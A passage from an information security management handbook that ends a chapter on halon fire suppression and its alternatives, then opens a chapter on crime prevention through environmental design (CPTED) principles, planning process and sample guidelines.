bicarbonate as the primary agent (Illinois Fire and Safety Company n.d.).
Finally, the gas-based system can use a variety of gases including argon, carbon 
dioxide (CO2), and halon. Gas-based systems work by affecting the oxygen levels 

Halon Fire Suppression Systems  ◾  371
within the environment and interrupting the chemical reaction. Because these sup-
pression systems interrupt the chemical reaction, they can create personnel safety 
issues that must be addressed during the system design and implementation.
27.6  Halon-Based Fire Suppression
Halon has a long history of use as a fire suppression agent. Halon is a generic term 
referring to a collection of chlorofluorocarbons (CFC) or halocarbons. CFC chemi-
cals were originally developed as refrigerants due to their unique chemical proper-
ties (Centre for Ecology and Hydrology n.d.). The first halon, known as Halon 104 
or carbon tetrachloride was used before the 20th century despite the toxic by-prod-
ucts from its use (H3R Clean Agents 2008). The United States National Library of 
Medicine Emergency Responder* database provides an extensive description of the 
effects of this highly toxic substance, which can exist in liquid and gaseous forms. 
Carbon tetrachloride requires the use of extensive protective clothing and self-con-
tained breathing equipment (United States National Library of Medicine 2006).
Halon 122, or dichlorodifluoromethane, and Halon 1001, or methyl bromide, 
were discovered between 1900 and 1947. Like Halon 104, both of these chemicals 
have equally toxic side effects (United States National Library of Medicine 2006).
Halon 1211 is a liquid streaming agent chemically known as bromochlorodi-
fluoromethane (International Labour Organization 2000). Halon 1211 has been 
widely used in managing airport and aviation fires (Federal Aviation Administration 
2007). It is less toxic than previous halons developed, but just as deadly from an 
ozone depletion perspective. However, when used in concentrations above 5 per-
cent, it should be used only when portable breathing apparatus is used. Unlike the 
liquid properties of Halon 1211, Halon 1301 is a gas used to flood an area and inter-
rupt the combustion. Halon 1301 is more commonly used in protecting enclosed 
areas with electrical equipment.
Halon is categorized by the National Fire Protection Association as a “clean 
agent,” meaning it is an electrically nonconducting, volatile, or gaseous fire extin-
guishant that does not leave a residue upon evaporation (H3R Clean Agents 2008). 
A clean agent fire suppression system is desirable in situations where “live electrical 
or electronic circuits are in use, the area is normally occupied by personnel, and the 
protected area contains objects or processes highly susceptible to extensive damage 
or downtime” (UNEP 2001, 19).
Clean agents are not only effective fire suppression agents, but they also do 
not leave a residue that could affect or damage the equipment being protected. 
Commonly used to protect expensive assets such as mainframe computer systems 
and telecommunications equipment, halon is effective as it does not leave any resi-
due that could result in secondary damage to the equipment.
*	The database is available at http://wiser.nlm.nih.gov/index.html.

372  ◾  Information Security Management Handbook
27.7  Halon Distribution Components
A halon distribution system consists of a number of pressurized cylinders to store 
the halon, a piping system to deliver the agent to the protection area, and nozzles 
that disperse the agent. The number of cylinders needed depends upon the size of 
the area to be protected. The larger the area, the more cylinders required. The piping 
system is a pressurized or “closed” system of a particular size to carry the agent to the 
nozzles. Because the system is under pressure, repairs or work around the pipe sys-
tems must be carefully conducted to prevent damage to the distribution systems.
With the transition away from halon to various replacements, companies with 
existing systems need to consult with a local authority on clean agent fire systems 
as the existing halon distribution system may not be compatible. Different require-
ments exist for the different halon replacement agents to ensure the proper distribu-
tion into the protected area.
27.8  Replacing Halons
In September 1987, the first of several landmark decisions to reduce and ultimately 
eliminate ozone depleting compounds was signed in Montreal, Canada. Known as 
the Montreal Protocol, it has been amended twice since its original signing and is 
part of the United Nations Environmental Program (Gielle Srl 2003).
The Montreal Protocol defined a set of problem chemicals and identified their 
removal from production and agreements to ban products that introduce ozone 
depleting chemicals into the atmosphere. The protocol set the production deadline 
at the end of 1993 for developed countries and 2010 for the developing countries 
(The World Bank 2008).
The Montreal Protocol focused primarily on reducing the use of chlorofluoro-
carbons (CFC), and the Kyoto Protocol aimed at specific reductions in global warm-
ing gases. Signed in December 1997, the fire protection industry was impacted as 
the Kyoto Protocol requires reductions in carbon dioxide and hydrofluorocarbons 
(HFC) (Gielle Srl 2003).
The decision to reduce ozone depleting agents, such as halon, was made because 
both CFC and HFC chemicals have been shown to cause damage to the ozone layer 
through mishandling, transfers to application cylinders, and use in fire protection 
systems and other manufacturing processes. Their long atmospheric lifetime and 
their chemical interaction with ozone and the atmosphere continue for many years.
Given the requirements of the Montreal and Kyoto accords, new gas-based fire 
suppression systems cannot use any halon. Existing halon systems, if discharged, 
cannot be refilled with halon and will require modification to support a halon alter-
native. Organizations that have a national security link or can claim “critical use” 
may qualify for extensions to the accords. Typically, these installations are aircraft, 
military, petrochemical, and marine industries.

Halon Fire Suppression Systems  ◾  373
27.9  Halon Alternatives
Unfortunately, there is no direct “drop-in” replacement for existing systems. A 
number of alternatives exist, however, which will require changes to the existing 
distribution system, and possibly replacement. The only accurate method of estab-
lishing the replacement costs is to have your installation inspected by a qualified 
company that can provide specific recommendations for your needs. Aside from 
determining the changes needed to the distribution system, the company can pro-
vide advice on the best halon alternative.
Three halon alternatives are Inergen, Halotron I, carbon dioxide, and FM200. 
Like Halon 1301, Inergen is a gas and stored in cylinders similar to carbon dioxide. 
The gas is composed of nitrogen, argon, and carbon dioxide, which are three naturally 
occurring gases (CJ Suppression Inc. n.d.). Unlike the halon systems, which dete-
riorate into toxic substances when released, Inergen does not interfere with human 
oxygen intake and does not decompose into toxic gases, eliminating personnel risk 
from the suppression agent (Fire Research–European Inergen Administration).
Like halon, Inergen affects the available oxygen in the protection area, reducing 
it to 15 percent, which is still capable of supporting human life, although the com-
bustion process is interrupted. An Inergen solution will require changes to existing 
halon systems, especially the distribution nozzles, to minimize air turbulence dur-
ing the Inergen discharge (Gielle Srl n.d.).
A second alternative to halon is Halotron I or II. Developed by American Pacific 
Corporation in the United States, Halotron is halocarbon based, but with very low 
ozone depletion, and is therefore allowed under current accords and legislation. 
Halotron I is a liquid streaming agent, and Halotron II is gaseous and can often 
be a direct replacement for Halon 1301 (American Pacific Corporation 2007). The 
Halotron products have been extensively tested and approved for use in aircraft, 
portable fire extinguishers, marine systems, computer rooms, and military applica-
tions to name a few (American Pacific Corporation 2007).
The distribution system for Halotron is specific to the application. Aircraft or 
marine systems can be portable handheld units or mobile tanks with 500 pounds 
or more of Halotron. Fixed distribution systems consist of cylinders, piping, and 
nozzles to deliver the agent into the protected space. As mentioned previously, some 
halon installations can be easily converted to Halotron.
A third halon alternative is FM200, produced by DuPont. Like the other alter-
natives, FM200 can be used in situations where personnel are present with no risk 
of injury to them from the discharge (DuPont 2008). FM200 distribution systems 
are somewhat different, as the agent is stored in liquid form and pressurized using 
nitrogen gas (DuPont 2008). This method allows the use of much smaller storage 
cylinders than other methods, consequently using much less space. This makes 
FM200 invaluable in situations where space is severely limited.
FM200 has no halocarbon components and is not banned or controlled under 
the Montreal or Kyoto protocols. With the exception of Denmark and Switzerland, 

374  ◾  Information Security Management Handbook
which carefully control the use of clean agents, FM200 is available for use in any 
country (DuPont 2008). Like the other clean agent systems discussed, FM200 uses 
piping and nozzles to distribute the agent in the protected area. Although FM200 is 
stored in pressurized form as a liquid, releasing the agent transforms it to a gas that 
is dispersed through the protected space using existing air flow.
These are only a few of the halon alternatives available. Whether selecting a 
replacement for an existing halon system or preparing to install a new clean agent 
system, careful consultation with a reputable fire suppression company is neces-
sary to ensure the installation is conducted according to your country’s safety and 
fire standards.
27.10  Conclusion
This chapter has examined the operation of halon-based fire suppression systems, 
including some of the available halon alternatives. The use of clean agent systems 
is widespread due to the massive amount of electrical and electronic components 
installed and both the large and small areas they occupy. As personal safety is para-
mount to all other concerns, selecting a clean agent system that will not create a 
dangerous environment for employees and emergency responders must be a critical 
factor in the selection and design of these systems.
Works Cited
American Institute of Steel Construction Inc. 2008, January 20. At what temperature does a 
typical fire burn? Retrieved January 20, 2008, from Structural Steel: http://www.aisc.
org/Template.cfm?Section=HOME&template=/CustomSource/FAQContentDisplay.
cfm&InterestCategoryID=402&FAQID=2119
American Pacific Corporation. 2007. Clean fire extinguishing agents. Retrieved April 18, 
2008, from AMPAC Halotron: http://www.halotron-inc.com/products.php
American Pacific Corporation. 2007. Halotron applications. Retrieved April 18, 2008, from 
AMPAC Halotron: http://www.halotron-inc.com/applications.php
Centre for Ecology and Hydrology. n.d. Chlorofluorocarbons (CFCs). Retrieved January 21, 
2008, from Air Pollution Information System: http://www.apis.ac.uk/overview/pollut-
ants/overview_CFCs.htm
CJ Suppression Inc. n.d. Fire suppression dry/chemical. Retrieved April 10, 2008, from CJ 
Suppression Inc.: http://www.cjsuppression.com/fire_suppression.htm
DuPont. 2008. DuPont FM200. Retrieved April 21, 2008, from DuPont: http://www2.
dupont.com/FE/en_US/products/FM200.html
Federal Aviation Administration. 2007, April 17. Halon 1211: alternative agents 
for airport fire fighting. Retrieved January 21, 2008, from Federal Aviation 
Administration: http://www.airporttech.tc.faa.gov/safety/halon.asp
Fire Research–European Inergen Administration. n.d. Retrieved April 17, 2008, from Fire 
Research: http://www.inergen.dk/

Halon Fire Suppression Systems  ◾  375
Fire Safety Advice Centre. 2007, August 19. Information about the fire triangle/tetrahe-
dron and combustion. Retrieved December 16, 2007, from The Fire Safety Advice 
Centre: http://www.firesafe.org.uk/html/miscellaneous/firetria.htm
Gielle Srl. 2003. Halon 1301, Halon 2402, Halon 1211: replacing halon gas. Retrieved April 
8, 2008, from Gielle Srl: http://www.fm200.biz/halon.htm
Gielle Srl. n.d. Inergen fire suppression system. Retrieved April 18, 2008, from Gielle 
Srl: http://www.gielle.it/inergen_en.htm
H3R Clean Agents. 2008. What is halon and how does it work? Retrieved January 2, 2008, 
from H3R Clean Agents: http://www.h3rcleanagents.com/support_faq_2.htm
Illinois Fire and Safety Company. n.d. Fire suppression systems. Retrieved January 21, 2008, 
from Illinois Fire and Safety Company: http://www.illinoisfire.com/new/systems/dry-
chemsystem.html
International Labour Organization. 2000. Bromochlorodifluoromethane. Retrieved 
December 18, 2007, from International Labour Organization: http://www.ilo.org/
public/english/protection/safework/cis/products/icsc/dtasht/_icsc06/icsc0635.htm
Riverdale Fire Department. 2007. Classifications of fire. Retrieved January 20, 2008, from 
Riverdale Fire Department: http://www.riverdalevfd.org/index.php?option=com_cont
ent&task=view&id=33&Itemid=56
The World Bank. 2008. Montreal protocol. Retrieved April 10, 2008, from The World 
Bank: http://go.worldbank.org/KXM814CLA0
UNEP. 2001, 1 2. Standards and codes of practice to eliminate dependency on halons. New 
York: United Nations Environment Programme.
United States National Library of Medicine. 2006, January 10. Methyl bromide. Retrieved 
January 2, 2008, from Wireless Information System for Emergency Responders: 
http://webwiser.nlm.nih.gov/getSubstanceData.do?substanceID=32&displaySubstanc
eName=Halon+1001
United States National Library of Medicine. 2006, January 10. Carbon tetrachloride. 
Retrieved January 2, 2008, from Wireless Information System for Emergency 
Responders: http://webwiser.nlm.nih.gov/getSubstanceData.do?substanceID=6&disp
laySubstanceName=Carbon+Tetrachloride&substanceMenuStage1=0%2B162


377
28
Chapter 
Crime Prevention through 
Environmental Design
Mollie E. Krehnke
Contents
28.1	 A Brief History of CPTED......................................................................378
28.2	 CPTED Concepts....................................................................................379
28.3	 Examples of CPTED Success...................................................................380
28.4	 Participants in CPTED Implementation..................................................381
28.5	 Community Benefits................................................................................381
28.6	 CPTED Design and Planning Process.....................................................382
28.6.1	Pre-Design....................................................................................382
28.6.1.1	Pre-Application Meeting................................................382
28.6.2	Design..........................................................................................382
28.6.2.1	Schematic Design...........................................................382
28.6.2.2	Design Development......................................................383
28.6.3	Plan Submission and Plan Review................................................383
28.6.3.1	Plan Review....................................................................383
28.6.3.2	Planning Commission Review and Approval..................383
28.6.4	Construction Documentation......................................................383
28.6.5	Bidding and Negotiation..............................................................384
28.6.6	Construction................................................................................384
28.6.7	Site Use: After Construction.........................................................384
28.7	 CPTED Guidelines for Various Environments........................................384
28.8	 Sample CTPED Guidelines.....................................................................385
28.8.1	Natural Surveillance.....................................................................385

378  ◾  Information Security Management Handbook
28.1  A Brief History of CPTED
Crime prevention through environmental design (CPTED; pronounced sep-ted) 
is the “proper design and effective use of the built environment that can lead to a 
reduction in the fear and incidence of crime, and an improvement in the quality of 
life.”1 This definition by C. Ray Jeffrey reflects the expanded, current (more holis-
tic) perspective of CPTED,2 encompassing (1) the criminal offender perspective 
regarding an environment and the risk of getting caught when committing a crime, 
and (2) the social dynamics, sense of ownership of the environment, and their asso-
ciated protective actions by persons who work, live, or traverse the environment en 
route to another destination.
This definition and the associated principles of environmental design have been 
established over decades of research by Wood, Jacobs, Angel, Jeffrey, Newman, 
Saville, and Cleveland.3 The work of these professionals has resulted in the iden-
tification and definition of concepts that have proven to reduce crime (through 
deterrence because prevention is not possible) where implemented and improve the 
quality of life for individuals who inhabit those environments.
For example, Oscar Newman’s research for the U.S. Department of Housing 
and Urban Development in the late 1960s included a 2,740-unit public housing 
high-rise development, Pruitt-Igoe, which never achieved more than 60 percent 
occupancy and was torn down about ten years after its construction at a loss of $300 
million because of rampant crime. Across the street, an older, smaller row-house 
complex, Carr Square Village, occupied by an identical population, was fully occu-
pied and free of crime during and after the construction, occupancy, and demoli-
tion of Pruitt-Igoe. Newman’s research regarding multiple communities, including 
Pruitt-Igoe, into what caused these differences in crime resulted in a new, but related, 
term of “defensible space.”4 This concept of ownership as a deterrent to crime has 
been accepted by professionals in the field and incorporated into the current widely 
accepted CPTED definition by Jeffrey and the associated CPTED principles.
28.8.2	Natural Access Control.................................................................386
28.8.3	Territorial Reinforcement.............................................................387
28.8.4	Maintenance.................................................................................387
28.8.5	Milieu/Management.....................................................................387
28.9	 Resources to Help in CPTED Implementation........................................387
28.9.1	Case Studies in the Designing Safer Communities 
Handbook....................................................................................387
28.9.2	CPTED Surveys for Site Assessment in the Designing Safer 
Communities Handbook...............................................................388
28.9.3	Resources in the Designing Safer Communities Handbook............388
28.9.4	CPTED Training.........................................................................389
28.10	Success: A Blend of Factors......................................................................389
Notes.................................................................................................................390

Crime Prevention through Environmental Design  ◾  379
28.2  CPTED Concepts
Six concepts are cited in various references that support the design, construc-
tion, and utilization processes of an environment to implement CPTED effec-
tively—two of those concepts have been incorporated into the following three 
CPTED principles:
	
1.	Natural access control: Design features that clearly indicate public routes and 
discourage access to private structural elements. These features decrease an 
opportunity for crime by creating in an offender a perception of unacceptable 
risk when attempting access to private areas (which marks the stranger as a 
possible intruder). Such design features include placement of entrances and 
exits, fencing, and landscaping to control traffic flow.
	
2.	Natural surveillance: Design features that increase the visibility of a property. 
These features maximize the ability of persons in the area to see persons in 
the vicinity (and avoid trouble) and allow external activities to be seen from 
adjacent building structures (by persons who could call for help). Such design 
features include landscaping, lighting, window and stairway placement, and 
building entrance and garage layouts.
	
3.	Territorial reinforcement: Design features that clearly indicate public and pri-
vate structural elements of a property. An individual will develop a sense of 
territoriality for a space with frequent activities in an area, a sense of owner-
ship. With this feeling of ownership, the individual will “want” to defend his 
environment. This ownership does not necessarily mean legal ownership; it 
may be a perceived ownership, such as the sense of ownership that employees 
feel for the office in which they work.5 The sense of territory and ownership 
by an individual is reinforced through regularly scheduled activities, inspec-
tions, and maintenance.
Following are the earlier concepts that have been incorporated into the three 
major principles:
Maintenance
◾◾
6: Characteristics of an environment that express ownership of the 
property. Deterioration of a property indicates less ownership involvement which 
can result in more vandalism, also known as the broken window theory.7 If a win-
dow is broken and remains unfixed for a length of time, vandals will break more 
windows. Crime is more prevalent in areas that are not maintained; as a result, 
law-abiding persons do not feel safe and do not want to frequent those areas.
Milieu: This feature is generally associated with environmental land use and 
◾
◾
reflects adjoining land uses and the ways in which a site can be protected by 
specific design styles.8 For example, a diverse housing mix is more likely to 
have people present at all times of the day, and bedroom communities are more 
likely to be vacant during various times of the day. Because criminals know 

380  ◾  Information Security Management Handbook
their neighborhoods and potential targets of crime, they are more likely to 
strike at times when they will not be discovered and possibly apprehended.
Another concept that can be implemented, as required, in addition to the 
three other CPTED principles is target hardening.9 The use of mechanical devices 
(locks, security systems, alarms, and monitoring equipment) and organized crime-
prevention strategies (security patrols, law enforcement) make an area harder to 
access, but may have a tendency to make the inhabitants “feel” unsafe. This tech-
nique is the opposite of “natural,” which reflects crime prevention as a by-product 
from normal and routine use of an environment.10 Target hardening often hap-
pens after crime has been committed. The integration of similar but customer 
service-oriented CTPED strategies in the initial environmental design may be as 
effective, but less threatening.
28.3  Examples of CPTED Success
CPTED is a multidisciplinary approach to the reduction of crime and the associ-
ated enhancement of the perception of personal safety by inhabitants of an environ-
ment. Because of their direct concern for these objectives, law enforcement agencies 
around the world have embraced these concepts and worked diligently within their 
communities and the local community resources to implement these principles in 
ways that are appropriate for their environments. Some cities, such as Federal Way, 
Washington, have incorporated the CPTED design principles into their city code 
requirements for project design. Others utilize the concepts to guide businesses and 
homeowners to assess their environment and its characteristics to reduce opportu-
nities for crime.11
In Bridgeport, Connecticut, the Phoenix Project resulted in a 75 percent 
◾
◾
decline in crime, the lowest since 1972, by controlling street drug trafficking 
with the use of CPTED plans that included traffic control devices with one-
way street design, increased tactical law enforcement, and mobilization of 
area businesses and residents.
In Knoxville, Tennessee, police, traffic engineers, public works officials, and 
◾
◾
residents participated in CPTED training and its implementation to address 
drug trafficking and excessive vehicle traffic in residential areas. This effort 
required street redesign, revised park schedules, and volunteer-led security 
survey teams. Vehicle cut-through traffic was reduced by 90 percent and 
drive-through drug trafficking no longer exists.
In Sarasota, Florida, a successful plan to reduce crime in one neighborhood 
◾
◾
has resulted in the integration of CPTED principles into the local planning 
process for all development and redevelopment in that city.

Crime Prevention through Environmental Design  ◾  381
In Cincinnati, Ohio, a CPTED partnership plan with the housing authority man-
◾◾
agement, residents, and police officials has resulted in a 12 to 13 percent decline 
in crime in the first three successive years after the plan was implemented.12
28.4  Participants in CPTED Implementation
Four general groups use the CPTED concepts: environmental designers (e.g., archi-
tects, landscape architects), land managers (e.g., park managers), community action 
groups (e.g., neighborhood watch groups), and law enforcement groups (e.g., park 
rangers, metropolitan police.) No group alone can successfully implement these 
principles because each has a unique perspective and knowledge base. The combi-
nation of that knowledge into a unified approach is necessary for the creation of an 
environment that deters crime and creates an environment where persons want to 
live, work, shop, and feel “ownership” so that they will do their part to ensure its 
protection.13 These groups must work with the city planners, commissioners, traffic 
engineers, and construction managers who must review the designs and implement 
the planned construction—hopefully, in a manner that effectively implements the 
desired CPTED principles.
28.5  Community Benefits
There are definite benefits to the utilization of CPTED principles in a community 
for municipal leadership (ML), local law enforcement (LLE), and community resi-
dents (CR). Following is a list of some of the benefits described in the Designing 
Safer Communities handbook:
Improved perception of safety and livability in public areas and neighbor-
◾
◾
hoods (ML)
More revenue from safer and busier business districts (ML)
◾
◾
Increased use of public parks and recreation facilities by residents (ML)
◾
◾
Increased opportunities to develop crime-prevention partnerships with resi-
◾
◾
dents (LLE)
Identification of potential crime problems in the community before they 
◾
◾
become serious (LLE)
Recognition that crime prevention is everyone’s responsibility (LLE)
◾
◾
Improved sense of security and quality of life through reduced fear of 
◾
◾
crime (CR)
Increased interaction among residents and stronger neighborhood bonds (CR)
◾◾
New crime-prevention and problem-solving skills (CR)
◾
◾
Enhanced knowledge of city government agencies and other resources (CR)
◾
◾
14

382  ◾  Information Security Management Handbook
The implementation of CPTED principles can help support community crime-
prevention goals. The implementation of the principles, when considered early in the 
design process for a community, does not increase the costs to residents or business 
owners. The decision process for the review and acceptance of a project will generally 
not be lengthened. If CPTED principles conflict with local building and fire codes, 
then a trained CPTED professional should be consulted to identify suitable alterna-
tives. In some circumstances, the community design groups have worked to modify 
the local codes for future projects, and to incorporate the CPTED principles and 
further enhance the safety and use of environments in that community.
28.6  CPTED Design and Planning Process
Depending on the scale of the development, multiple stages of review and construc-
tion can take place. The following is a generic process that reflects key consider-
ations in site design and instruction, and provides examples of CPTED concerns 
that should be addressed during each phase.
28.6.1  Pre-Design
28.6.1.1  Pre-Application Meeting
Some communities require a pre-application meeting to discuss and review the 
expected land use before the design process begins. Discussions on the location, 
siting, and design of new or remodeled facilities can reduce the costs of retrofitting 
a design to address the desired CPTED principles.
CPTED concerns: once the design has been established, changes may be lim-
ited to those required by law or policy—no matter how useful (from a CPTED 
viewpoint) they may be. Therefore, CPTED input before the plan is reviewed can 
save the owner a significant amount of money and time. Such a review is not a 
standard practice in municipal and corporate developments.
28.6.2  Design
28.6.2.1  Schematic Design
This level of the design presents a list of the requirements regarding the intended 
use(s) of the property. This document includes the general site organization, includ-
ing the building location, parking location, site entrances and exits, and building 
entrances and exits.
CPTED concerns: how will the development affect the existing neighborhood 
and how will the neighborhood affect the security of the development? These rela-
tionships will affect later decisions regarding access control measures, surveillance 

Crime Prevention through Environmental Design  ◾  383
opportunities from various locations on and adjacent to the site, design details, and 
policies regarding use.
28.6.2.2  Design Development
This level of design lists the size and shape of buildings, parking, and other site fea-
tures. Building structural features defined at this time include plumbing, lighting, 
communications systems, and door and window types and locations.
CPTED concerns: what are the design influences with regard to opportuni-
ties for crime, particularly the location of “public” and “private” activities, auto-
mobile and pedestrian routes, and the use of landscaping to provide places of 
concealment or reduce surveillance opportunities. Other features that have to 
be considered are the placement of fences, walls, dumpsters, signs and graphics, 
and lighting.
28.6.3  Plan Submission and Plan Review
28.6.3.1  Plan Review
Local agencies’ reviews of plans are limited to those items required by ordinance or 
local policy. Persons in the review process will review different components of the 
proposal, e.g., the traffic engineer will focus on access and circulation.
CPTED concerns: crime prevention and security issues are left to the law-
enforcement representative or CPTED reviewer—a review that is generally more 
the exception than the rule—and such comments, if there is a review, may be 
viewed as optional.
28.6.3.2  Planning Commission Review and Approval
This step may be required only for large projects. If there is a review, it does provide 
an opportunity for public input on issues of crime and safety.
28.6.4  Construction Documentation
Construction documents include the construction drawings and a manual of mate-
rials and product specifications. These documents are used to solicit bids for con-
struction services and building materials and products, and to guide the site and 
building construction and installation of related materials.
CPTED concerns: this documentation is often overlooked as a source of 
information that is beneficial in assessing the ability of a site and its buildings 
to reduce crime. The specifications manual can be useful in identifying prob-
lems that could result from the use of certain materials with regard to life expec-
tancy and required maintenance. Breaking and entering, vandalism, and graffiti 

384  ◾  Information Security Management Handbook
increase the life costs of such materials by the cost to replace the materials or 
to repair the damage done to the site in a timely manner—to implement the 
CPTED maintenance principle.
28.6.5  Bidding and Negotiation
During bidding and negotiation, the contractors may request material or product 
substitutions to reduce costs. Contractors may not understand that the substitu-
tions are not “equivalent” and may negatively impact the CPTED principles that 
should be addressed.
CPTED concerns: the substitutions can “appear” to be beneficial to the client, 
but significantly reduce the ability of the resulting environment to reduce crime. 
Examples of CPTED desirable materials are graffiti-resistant materials on walls 
and other surfaces, the use of constant (rather than average) lighting standards for 
pedestrians in designated areas, and the use of landscaping materials that grow only 
to a certain height or can easily be maintained for ease of surveillance by persons 
in the area.
28.6.6  Construction
Observation of the construction activities throughout the construction process is 
vital to the success of the design to ensure that the design is true to the plan and the 
specified materials are used in the construction process.
CPTED concerns: the unauthorized substitutions in materials that may be con-
trary to the CPTED principle to be implemented in the design.
28.6.7  Site Use: After Construction
The way that the property will be used when it is completed is as vital to the preven-
tion of crime as its design, including the hours of activity and scheduling, assign-
ment of space, property maintenance, and disciplinary code for violators.
CPTED concerns: the implementation of CPTED principles by property own-
ers, managers, and residents is necessary to the deterrence of crime and the sense of 
safety for the residents.
28.7  CPTED Guidelines for Various Environments
The Department of Community Development Services in Federal Way, 
Washington, has created a CPTED Checklist to assist the designer of a proposed 
project in implementing the CPTED principles that are identified in the Federal 
Way City Code Section 22-1630. The checklist states the functional area per-
formance standards by topic area, indicating whether the standard is applicable 

Crime Prevention through Environmental Design  ◾  385
during the site plan review or during the building permit review; possible strat-
egies for implementation of that principle, including a write-in section; and 
provides a column for the results of the agency analysis, including whether the 
design conforms, requires revision, or is not applicable. The topic areas for natu-
ral surveillance include blind corners, site and building layout for multiple fam-
ily development, commercial/retail/industrial and community facilities, surface 
parking and parking structures, common/open space areas, entrances, fencing, 
landscaping, exterior lighting, mix of uses, and security bars/shutters/doors. The 
topic areas for access control include building identification, entrances, landscap-
ing, landscaping location, security, and signage. The topic areas for ownership are 
maintenance and materials.15
The Crime Prevention Unit of the Fairfield Police Department in Fairfield, 
California, has created a brochure to explain the CPTED principles briefly and a 
short sample survey to allow businesses to assess the status of their environment 
with regard to the CPTED principles. The topics covered include access control, 
maintenance, natural surveillance, and territorial reinforcement. This allows the 
reader to become familiar with the concepts, assess his surroundings, and identify 
areas for improvement.16
The Crime Prevention Unit of the Prince William County Police Department 
in Virginia has created an extensive guide for implementing the CPTED principles, 
associated strategies, and pictures that illustrate the protection strategies being pre-
sented. The topics presented include the CPTED principles; CPTED techniques 
for single family homes, neighborhoods, multifamily homes (single buildings and 
complexes), institutions, commercial “drive-throughs,” commercial storefronts, 
shopping malls, office buildings, industries, parking garages/structures, and parks/
trails/open spaces, target hardening tips and techniques, landscaping and lighting, 
and watch programs.17
28.8  Sample CTPED Guidelines
The actual implementation of CPTED principles is dependent on the design of 
the physical space in relation to the normal and expected use of the space and the 
predictable behavior of the bona fide users and offenders. Therefore, the imple-
mentation of some CPTED principles without consideration for the space and its 
use may not result in the desired results. Use the examples (noted later) cautiously 
and within the perspective of a unified, professional design. When considering the 
design of an area, the present and future uses need to be considered.
28.8.1  Natural Surveillance
Fully illuminate all doorways that open to the outside.
◾
◾
The front door to the building should be at least partially visible from the street.
◾◾

386  ◾  Information Security Management Handbook
Install windows on all sides of the building to provide full visibility of 
◾
◾
the property.
Construct elevators and stairwells to be open and well lighted, not enclosed 
◾
◾
behind solid walls.
Provide appropriate illumination to doorways that open to the outside 
◾
◾
and sidewalks.
Select and install appropriate landscaping that will allow unobstructed views 
◾
◾
of vulnerable doors and windows from the street and other properties. Avoid 
landscaping that might create blind spots.
Use security-focused (rather than aesthetically pleasing) lighting that 
◾
◾
enables pedestrians to see clearly and to identify potential threats at 
night. For example, high- or low-pressure sodium vapor lights can pro-
vide evenly distributed lighting that reduces patches of darkness at the 
ground level and enables the human eye to pick up details, with reduced 
energy consumption.18
Make parking areas visible from windows and doors.
◾
◾
Ensure that signs in the front windows of businesses and commercial store-
◾
◾
fronts do not cover the windows or block necessary views of the exterior 
space.
Position restrooms in office buildings to be visible from nearby offices.
◾
◾
Keep dumpsters visible and avoid creating blind spots or hiding places, or 
◾
◾
place them in secured corrals or garages.
28.8.2  Natural Access Control
Use signs to direct visitors or patrons to building entrances and parking.
◾
◾
In a business or institution, require visitors to pass through a “check point” 
◾
◾
attended by those in authority, e.g., receptionist, guard.
Locate check-out counters at the front of the store, clearly visible from 
◾
◾
the outside.
Provide clearly marked transitional zones that indicate movement from pub-
◾
◾
lic to semipublic to private spaces.
Install paving treatments, plantings, and architectural design features, such 
◾
◾
as columned gateways, to direct visitors to the proper entrance and away from 
private areas.
Design streets to discourage cut-through or high-speed traffic.
◾
◾
Install walkways in locations safe for pedestrians, and keep them 
◾
◾
unobstructed.
Keep balcony railings and patio enclosures less than 42-inches high and avoid 
◾
◾
using opaque materials.
Block off dead-end spaces with fences or gates.
◾
◾
Prevent easy access to the roof or fire escape from the ground.
◾
◾

Crime Prevention through Environmental Design  ◾  387
28.8.3  Territorial Reinforcement
Use front stoops or porches in homes to create a transitional area between the 
◾
◾
street and the home.
Define property lines and private areas with plantings, pavement treatments, or 
◾◾
partial see-through fences. Make private areas distinguishable from public areas.
Use signage to identify and define areas.
◾
◾
Separate employee parking from visitor parking and shipping and receiv-
◾
◾
ing areas.
28.8.4  Maintenance
Keep trees and shrubs trimmed back from windows, doors, and walkways. 
◾
◾
Keep shrubs trimmed to three feet and prune lower branches of trees up to 
seven feet to maintain clear visibility.
Use exterior lighting at night and keep it in working order.
◾
◾
Enforce deed restrictions and covenants, in addition to all county codes. 
◾
◾
Disregard of these issues makes a site appear uncared for and less secure.
Maintain signs and fencing and remove graffiti promptly.
◾
◾
Maintain parking areas to high standards without potholes or trash.
◾
◾
28.8.5  Milieu/Management
Interaction between neighbors is vital to the awareness of persons and activi-
◾
◾
ties in the area. Management may need to create opportunities for neighbors 
to get to know one another.
If security systems are utilized, ensure all employees and other authorized 
◾
◾
persons are familiar with the security system to avoid false alarms.
Set operating hours to coincide with those of neighboring businesses.
◾
◾
Avoid shifts and situations where only one employee is present.
◾
◾
Fully illuminate interior spaces.
◾
◾
Business associations should work together to promote shopper and business 
◾
◾
safety and the appearance of safety.
28.9  Resources to Help in CPTED Implementation
28.9.1  Case Studies in the Designing Safer 
Communities Handbook
Several of the nine case studies noted in the handbook are highlighted in Section 
28.3. The case studies provide a description of the problem, the process for deter-
mining a CPTED solution to the problem, associated city actions to resolve the 

388  ◾  Information Security Management Handbook
problem, lessons learned, and a point of contact to discuss the case study activi-
ties. The diversity of examples provides the reader with a good introduction to the 
CPTED problem-solving process.
28.9.2  CPTED Surveys for Site Assessment in the 
Designing Safer Communities Handbook
The handbook provides several surveys in the appendices to conduct assessments of 
the area being studied for solutions to the criminal activities in the area. These sur-
veys guide the analysis and enable the CPTED planning team to assess the extent 
and types of crimes in the area under consideration to determine an appropriate 
solution. The surveys can be modified to address the area under consideration, but 
they serve as an example of ways to obtain the necessary information to design an 
appropriate solution to crime in an area or crime deterrence in a new residential 
development or business environment.
There is a Neighborhood Inventory that supports documentation of the number 
and types of crimes in the area and the percentage change over the past five years, 
the present and future land use for various types of dwellings in the neighborhood, 
the change in number of dwelling and commercial types, the conditions of the 
neighborhood, and the ages of the persons residing in the neighborhood.
There is a Neighborhood Survey that can be used to document individual resi-
dents’ perspectives on the quality of life in the neighborhood, level of problem 
for various activities in the neighborhood (e.g., crime, schools, drug trafficking, 
homelessness, noise, traffic, trash, abandoned buildings, graffiti, and unsupervised 
kids). Respondents are also asked about the type of community groups in which 
the respondent is active, the frequency with which neighbors get together for social 
events, respondent as a victim of crime, areas where the respondent does not feel 
safe, and general education/residence/income characteristics of the respondent. 
Finally, the respondents are asked if they have any resources/skills that they would 
like to contribute to the neighborhood.
28.9.3  Resources in the Designing Safer 
Communities Handbook
The Organizational Resources listing in the appendix provides contact information 
for organizations that are active in areas related to crime including state criminal 
justice agencies, crime prevention associations, area colleges and universities, local 
law enforcement agencies, and local municipal planning commissions.
